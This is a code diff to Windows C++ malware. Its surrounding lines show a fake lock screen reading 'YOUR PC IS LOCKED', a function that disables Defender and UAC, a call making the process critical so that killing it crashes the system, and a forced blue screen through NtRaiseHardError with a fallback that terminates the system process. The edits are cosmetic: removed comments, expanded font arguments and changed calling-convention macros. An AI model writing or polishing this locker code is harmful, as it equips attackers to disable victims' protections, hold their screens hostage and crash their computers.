@@ -5,6 +5,7 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
+#include <shellapi.h>
 #include <string>
 #include <vector>
 
@@ -31,7 +32,7 @@ void RequestAdmin();
 
 int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow)
 {
-    RequestAdmin();  // Ensure we have admin rights
+    RequestAdmin();
     Warnings();
     const wchar_t CLS[] = L"MainWnd";
     WNDCLASS wc = {};
@@ -54,7 +55,6 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow)
     return 0;
 }
 
-// Request administrator privileges if missing
 void RequestAdmin()
 {
     BOOL isAdmin = FALSE;
@@ -76,7 +76,6 @@ void RequestAdmin()
         sei.nShow = SW_NORMAL;
         if (ShellExecuteEx(&sei))
             ExitProcess(0);
-        // If user rejected UAC prompt, just continue without admin
     }
 }
 
@@ -149,7 +148,9 @@ LRESULT CALLBACK LockerProc(HWND h, UINT m, WPARAM w, LPARAM l)
         PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps); RECT r; GetClientRect(h, &r);
         HBRUSH b = CreateSolidBrush(RGB(0, 0, 0)); FillRect(dc, &r, b); DeleteObject(b);
         SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(255, 0, 0));
-        HFONT f = CreateFont(48, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, L"Consolas");
+        HFONT f = CreateFont(48, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
+            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+            DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
         SelectObject(dc, f);
         DrawText(dc, L"YOUR PC IS LOCKED\nType the hidden key to unlock.", -1, &r,
             DT_CENTER | DT_VCENTER | DT_WORDBREAK);
@@ -200,8 +201,8 @@ void DisableDefenderAndUAC()
     }
 }
 
-typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
-typedef NTSTATUS (NTAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
+typedef NTSTATUS (WINAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
+typedef NTSTATUS (WINAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
 
 // Makes the current process critical — terminating it will cause a BSOD
 void MakeProcessCritical(BOOL critical)
@@ -237,7 +238,6 @@ void DoBSOD()
             NtRaiseHardError(0xC0000420, 0, 0, 0, 6, &response);
         }
     }
-    // Fallback: kill critical system process
     TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, 4), 1);
 }
 
